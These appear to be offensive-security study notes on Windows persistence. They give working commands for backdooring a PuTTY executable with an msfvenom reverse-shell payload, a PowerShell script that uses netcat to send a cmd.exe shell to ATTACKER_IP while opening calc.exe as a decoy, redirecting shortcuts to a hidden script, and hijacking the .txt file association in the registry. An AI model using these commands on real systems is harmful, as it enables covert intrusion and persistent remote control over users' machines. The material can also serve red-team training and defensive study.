
## Modify existing executable
- Modify any executable file that user frequently uses and add backdoor in them. Eg. putty.exe
- Locate the executable, say `C:\Program Files\PuTTY\putty.exe`
- Download it to our own machine
- Use `msfvenom` to plant backdoor in the putty file
```sh
$ msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
```

## Update a shortcut target
- Instead of replacing the original executable, we can update the shortcut to point to modified binary file
- Simple powershell script with backdoor

```powershell
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e C:\WIndows\System32\cmd.exe ATTACKER_IP 4445"

C:\Windows\System32\calc.exe
```

- Update the shortcut's target to point to our script

```powershell
powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
```

## Hijacking File Associations

-  hijack any file association to force the operating system to run a shell whenever the user opens a specific file type.
- default operating system file associations are kept inside the registry, where a key is stored for every single file type under `HKLM\Software\Classes\`
- Program for text file: go and check for the `.txt` subkey and find which **Programmatic ID (ProgID)** is associated with it
- search for a subkey for the corresponding ProgID (also under `HKLM\Software\Classes\`), in this case, `txtfile`, where we will find a reference to the program in charge of handling .txt files. Most ProgID entries will have a subkey under `shell\open\command` where the default command to be run for files with that extension is specified
- Update the command to open the filetype with our backdoor command. Eg.
```powershell
powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
```
